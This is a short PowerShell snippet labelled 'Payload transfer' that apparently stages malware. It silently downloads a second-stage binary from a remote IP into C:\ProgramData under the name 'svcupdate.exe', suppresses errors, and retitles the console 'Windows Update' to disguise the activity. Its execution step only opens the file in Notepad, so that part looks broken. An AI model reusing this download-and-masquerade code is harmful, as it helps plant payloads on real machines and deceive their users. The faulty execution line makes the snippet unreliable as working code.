# Payload transfer
Invoke-WebRequest -Uri 'https://192.0.2.228/stage2.bin' -OutFile "C:\ProgramData\svcupdate.exe" -UseBasicParsing -ErrorAction SilentlyContinue
Start-Process -FilePath "notepad.exe" -ArgumentList "C:\ProgramData\svcupdate.exe" -ErrorAction SilentlyContinue
$Host.UI.RawUI.WindowTitle = "Windows Update"
